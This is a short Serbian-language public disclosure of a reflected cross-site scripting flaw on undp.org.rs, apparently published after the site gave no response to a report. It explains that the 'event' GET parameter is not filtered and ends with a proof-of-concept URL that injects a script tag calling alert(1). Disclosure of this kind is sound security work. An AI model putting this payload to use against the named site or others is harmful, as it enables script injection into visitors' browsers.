## undp.org.rs - Cross Site Scripting (XSS)

10.03.2017. sam prijavio XSS na sajtu, do danas (11.10.2017.) nisam dobio nikakav odgovor, pa sam odlucio da objavim detalje propuste.

Vrednost iz GET parametra "event" se ne filtrira prilikom prikaza, pa to normalno dovodi do XSS-a.


#### PoC:

```
http://www.undp.org.rs/?event=public.ic"><script>alert(1)</script>&PostRefNo=1658
```
